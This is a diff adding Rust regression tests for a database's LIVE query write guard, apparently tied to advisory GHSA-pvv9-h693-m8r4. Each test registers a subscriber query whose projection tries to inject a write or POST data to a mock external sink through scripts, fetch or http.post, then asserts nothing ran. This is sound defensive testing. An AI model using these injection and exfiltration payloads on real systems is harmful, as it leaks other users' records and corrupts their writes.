@@ -1150,3 +1150,202 @@ async fn live_diff_notifications_carry_value_diff_operations() -> Result<()> {
 	);
 	Ok(())
 }
+
+/// A LIVE query's subscriber-authored projection and WHERE clauses run at
+/// notification time inside the triggering write's transaction. They must not
+/// perform writes (GHSA-pvv9-h693-m8r4): a write subquery there lets a
+/// subscriber inject side effects into another user's write. Register a LIVE
+/// query whose projection writes, then trigger a notification, and assert the
+/// write subquery did not execute.
+#[tokio::test]
+async fn live_query_clauses_may_not_write() -> Result<()> {
+	let (_, dbs) = new_ds("test", "test", true).await?;
+	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);
+
+	let res = &mut dbs
+		.execute("DEFINE TABLE person SCHEMALESS; DEFINE TABLE audit SCHEMALESS;", &ses, None)
+		.await?;
+	skip_ok(res, 2)?;
+
+	// Register a LIVE query whose projection contains a write subquery.
+	let res = &mut dbs
+		.execute("LIVE SELECT *, (CREATE audit SET saw = id) AS exfil FROM person;", &ses, None)
+		.await?;
+	let lqid = res.remove(0).result?;
+	assert_eq!(
+		lqid.kind(),
+		Kind::Uuid,
+		"the LIVE query must register before the write that fires it"
+	);
+
+	// Trigger a notification by writing to the watched table.
+	let res = &mut dbs.execute("CREATE person:1;", &ses, None).await?;
+	skip_ok(res, 1)?;
+
+	// The subscriber's write subquery must not have executed.
+	let res = &mut dbs.execute("SELECT VALUE id FROM audit;", &ses, None).await?;
+	let audit = res.remove(0).result?;
+	assert_eq!(
+		audit,
+		Value::Array(Default::default()),
+		"a write in a LIVE projection must not execute at notification time, audit held: {audit:?}",
+	);
+
+	Ok(())
+}
+
+/// The LIVE write guard (GHSA-pvv9-h693-m8r4) must hold across a re-entry
+/// boundary, not only for a write subquery evaluated directly in the clause.
+///
+/// An embedded script's `surrealdb.query()` bridge rebuilds its execution frame
+/// from the clause's `Options`, so the guard must sit on the `Options` and not
+/// on the notification context alone. A subscriber that wraps `CREATE audit` in
+/// a script reaches the same injected write otherwise, once for every triggering
+/// transaction. The `api::invoke` builtin rebuilds its endpoint frame from the
+/// same `Options`, so it is closed by the same guard.
+#[cfg(feature = "scripting")]
+#[tokio::test]
+async fn live_query_script_clause_may_not_write() -> Result<()> {
+	let (_, dbs) = new_ds("test", "test", true).await?;
+	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);
+
+	let res = &mut dbs
+		.execute("DEFINE TABLE person SCHEMALESS; DEFINE TABLE audit SCHEMALESS;", &ses, None)
+		.await?;
+	skip_ok(res, 2)?;
+
+	// Register a LIVE query whose projection runs a write through an embedded
+	// script's `surrealdb.query()` bridge.
+	let res = &mut dbs
+		.execute(
+			"LIVE SELECT *, (function() { return await surrealdb.query('CREATE audit SET saw = true'); }) AS exfil FROM person;",
+			&ses,
+			None,
+		)
+		.await?;
+	let lqid = res.remove(0).result?;
+	assert_eq!(
+		lqid.kind(),
+		Kind::Uuid,
+		"the LIVE query must register before the write that fires it"
+	);
+
+	// Trigger a notification by writing to the watched table.
+	let res = &mut dbs.execute("CREATE person:1;", &ses, None).await?;
+	skip_ok(res, 1)?;
+
+	// The subscriber's script write must not have executed.
+	let res = &mut dbs.execute("SELECT VALUE id FROM audit;", &ses, None).await?;
+	let audit = res.remove(0).result?;
+	assert_eq!(
+		audit,
+		Value::Array(Default::default()),
+		"a write in a LIVE projection's script must not execute at notification time, audit held: {audit:?}",
+	);
+
+	Ok(())
+}
+
+/// A LIVE projection's script can reach an external system through the builtin
+/// bridge (`surrealdb.functions.http.post`), not only through SurrealQL
+/// re-entry. That path must honour the LIVE no-external-write guard
+/// (GHSA-pvv9-h693-m8r4): the bridge dispatches a builtin without passing the
+/// VM's own guard, so a POST would exfiltrate the triggering record once for
+/// every write. The sink must receive nothing.
+#[cfg(all(feature = "scripting", feature = "http"))]
+#[tokio::test]
+async fn live_query_script_http_post_may_not_exfiltrate() -> Result<()> {
+	use wiremock::matchers::{method, path};
+	use wiremock::{Mock, MockServer, ResponseTemplate};
+
+	let server = MockServer::start().await;
+	Mock::given(method("POST"))
+		.and(path("/sink"))
+		.respond_with(ResponseTemplate::new(200))
+		.mount(&server)
+		.await;
+
+	let (_, dbs) = new_ds("test", "test", true).await?;
+	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);
+
+	let res = &mut dbs.execute("DEFINE TABLE person SCHEMALESS;", &ses, None).await?;
+	skip_ok(res, 1)?;
+
+	// The projection POSTs to an external sink from a script.
+	let sql = format!(
+		"LIVE SELECT *, (function() {{ return await surrealdb.functions.http.post('{}/sink', {{ saw: true }}); }}) AS exfil FROM person;",
+		server.uri()
+	);
+	let res = &mut dbs.execute(&sql, &ses, None).await?;
+	let lqid = res.remove(0).result?;
+	assert_eq!(
+		lqid.kind(),
+		Kind::Uuid,
+		"the LIVE query must register before the write that fires it"
+	);
+
+	// Trigger a notification by writing to the watched table.
+	let res = &mut dbs.execute("CREATE person:1;", &ses, None).await?;
+	skip_ok(res, 1)?;
+	tokio::time::sleep(Duration::from_millis(300)).await;
+
+	// The subscriber's POST must not have reached the sink.
+	let received = server.received_requests().await.unwrap_or_default();
+	assert!(
+		received.is_empty(),
+		"a LIVE projection's script must not POST to an external system at notification time, the sink got {} request(s)",
+		received.len(),
+	);
+
+	Ok(())
+}
+
+/// The sibling vector through the `fetch` global, which reaches the network
+/// through its own client rather than the builtin bridge. A write-method or
+/// body-bearing `fetch` is refused in a LIVE frame the way `http::post` is; a
+/// read with no body is left alone, as `http::get` is. The sink must receive
+/// nothing for the POST.
+#[cfg(all(feature = "scripting", feature = "http"))]
+#[tokio::test]
+async fn live_query_script_fetch_may_not_exfiltrate() -> Result<()> {
+	use wiremock::matchers::{method, path};
+	use wiremock::{Mock, MockServer, ResponseTemplate};
+
+	let server = MockServer::start().await;
+	Mock::given(method("POST"))
+		.and(path("/sink"))
+		.respond_with(ResponseTemplate::new(200))
+		.mount(&server)
+		.await;
+
+	let (_, dbs) = new_ds("test", "test", true).await?;
+	let ses = Session::owner().with_ns("test").with_db("test").with_rt(true);
+
+	let res = &mut dbs.execute("DEFINE TABLE person SCHEMALESS;", &ses, None).await?;
+	skip_ok(res, 1)?;
+
+	let sql = format!(
+		"LIVE SELECT *, (function() {{ return await fetch('{}/sink', {{ method: 'POST', body: 'saw' }}); }}) AS exfil FROM person;",
+		server.uri()
+	);
+	let res = &mut dbs.execute(&sql, &ses, None).await?;
+	let lqid = res.remove(0).result?;
+	assert_eq!(
+		lqid.kind(),
+		Kind::Uuid,
+		"the LIVE query must register before the write that fires it"
+	);
+
+	let res = &mut dbs.execute("CREATE person:1;", &ses, None).await?;
+	skip_ok(res, 1)?;
+	tokio::time::sleep(Duration::from_millis(300)).await;
+
+	let received = server.received_requests().await.unwrap_or_default();
+	assert!(
+		received.is_empty(),
+		"a LIVE projection's script must not fetch-POST to an external system at notification time, the sink got {} request(s)",
+		received.len(),
+	);
+
+	Ok(())
+}
